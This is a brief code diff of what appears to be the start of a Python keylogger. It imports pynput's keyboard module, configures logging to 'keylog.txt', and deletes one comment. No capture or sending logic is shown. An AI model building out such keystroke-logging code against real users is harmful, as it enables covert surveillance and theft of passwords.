@@ -1,7 +1,7 @@
 from pynput import keyboard
 import logging
 
-# Configure logging
+
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 
